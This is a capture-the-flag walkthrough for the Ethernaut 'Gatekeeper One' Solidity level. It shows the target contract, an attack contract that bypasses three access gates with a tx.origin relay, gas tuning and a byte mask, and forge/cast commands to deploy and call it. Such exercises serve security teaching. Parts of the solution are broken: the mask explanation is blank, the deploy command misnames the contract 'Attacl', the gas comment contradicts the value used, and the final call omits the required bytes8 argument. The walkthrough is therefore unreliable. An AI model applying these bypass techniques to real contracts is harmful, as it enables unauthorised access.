## Gatekeeper One Level Outline

**Difficulty : 5/10**

Make it past the gatekeeper and register as an entrant to pass this level.

```solidity  
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x9b261b23cE149422DE75907C6ac0C30cEc4e652A)

## Solution

To pass the first modifier `gateOne()`, the transaction needs to come from a smart contract.

To pass the second modifier `gateTwo()`, the remaining gas needs to be divisible by 8191. To satisfy this, we will use [foundry's debugger](https://book.getfoundry.sh/forge/debugger.html?highlight=debugger#debugger) to find the right gas amount in order to pass the check.

To pass the third modifier `gateThree()`, we need to byte mask our address with `` to pass all three checks.

### Walkthrough

##### 1. Create a new [forge project](https://book.getfoundry.sh/projects/creating-a-new-project.html) with the following contract in `src` 

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attack {
    GateKeeperOne gateKeeper;

    constructor(address _gateKeeper) {
        gateKeeper = GateKeeperOne(_gateKeeper);
    }

    // 0x8208b86dA007aa26 (last 4 bytes of addr)
    // 7747 (gas used found from debugger) + 57337 (8191 * 7)
    function enter(bytes8 addr) public {
        bytes8 key = addr & 0xFFFFFFFF0000FFFF;
        gateKeeper.enter{gas: 7747}(key);
    }
}

interface GateKeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}
```

##### 2. 

```console
forge create src/Contract.sol:Attacl --constructor-args $LEVEL_ADDRESS --private-key  $PRIVATE_KEY
```

##### 3. Call our newly deployed contract 
```console
cast send $DEPLOYED_ADDRESS "enter()" --private-key=$PRIVATE_KEY 
```
> Replace $DEPLOYED_ADDRESS with the address of your deployed contract

## [:arrow_left: Back To Main Menu](../)
